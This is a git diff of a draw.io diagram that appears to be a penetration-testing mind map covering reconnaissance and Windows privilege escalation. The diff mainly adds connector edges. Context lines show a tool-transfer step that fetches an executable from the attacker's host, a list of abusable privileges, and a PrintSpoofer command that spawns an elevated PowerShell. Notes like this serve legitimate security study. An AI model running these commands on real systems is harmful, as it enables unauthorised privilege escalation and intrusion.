@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2024-03-01T17:18:27.443Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0" etag="tX52k-oq8VkA6Yg9p0qs" version="23.1.6" type="github" pages="8">
+<mxfile host="app.diagrams.net" modified="2024-03-01T17:18:39.872Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0" etag="8xTuo3iBv0QW1SPwvrTk" version="23.1.6" type="github" pages="8">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel dx="1194" dy="763" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -779,6 +779,9 @@
         <mxCell id="eydW96J8nSPCopO3k54l-5" value="&lt;div&gt;send script on remote machine&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;mine: python3 -m http.server 8000&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;remote: iwr -uri http://my-ip:8000/&lt;/font&gt;&lt;font color=&quot;#4a86e8&quot;&gt;tool.exe&lt;/font&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="-310" y="195" width="240" height="110" as="geometry" />
         </mxCell>
+        <mxCell id="jzq9HZ4WNqnn6DcPguP3-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="qmehafYx0e8W1bQMVf-2-1" target="jzq9HZ4WNqnn6DcPguP3-1">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
         <mxCell id="qmehafYx0e8W1bQMVf-2-1" value="&lt;div&gt;SEImpersonate Privilege&amp;nbsp;&lt;/div&gt;&lt;div&gt;OR &lt;br&gt;&lt;div&gt;&lt;code&gt;&lt;/code&gt;SeBackupPrivilege&lt;br/&gt;SeAssignPrimaryToken&lt;br/&gt;SeLoadDriver&lt;br/&gt;SeDebug&lt;/div&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="660" y="317.5" width="190" height="95" as="geometry" />
         </mxCell>
@@ -863,8 +866,14 @@
         <mxCell id="KbV5osIUXq8xYqzZ2qIY-5" value="&lt;div&gt;&lt;b&gt;Another user&lt;em&gt;&lt;br&gt;&lt;/em&gt;&lt;/b&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#ffbe6f;strokeColor=#ffbe6f;fontColor=#ffffff;" vertex="1" parent="1">
           <mxGeometry x="1140" y="255" width="180" height="70" as="geometry" />
         </mxCell>
+        <mxCell id="jzq9HZ4WNqnn6DcPguP3-5" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" edge="1" parent="1" source="jzq9HZ4WNqnn6DcPguP3-1" target="jzq9HZ4WNqnn6DcPguP3-2">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
         <mxCell id="jzq9HZ4WNqnn6DcPguP3-1" value="≥ Windows 10 1809 / Server 2019" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
           <mxGeometry x="920" y="333.75" width="210" height="62.5" as="geometry" />
+        </mxCell>
+        <mxCell id="jzq9HZ4WNqnn6DcPguP3-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0.75;entryY=1;entryDx=0;entryDy=0;" edge="1" parent="1" source="jzq9HZ4WNqnn6DcPguP3-2" target="eydW96J8nSPCopO3k54l-2">
+          <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="Printspoofer" cmd=".\PrintSpoofer64.exe -i -c powershell.exe" id="jzq9HZ4WNqnn6DcPguP3-2">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;fillColor=default;strokeColor=#e5a50a;" vertex="1" parent="1">
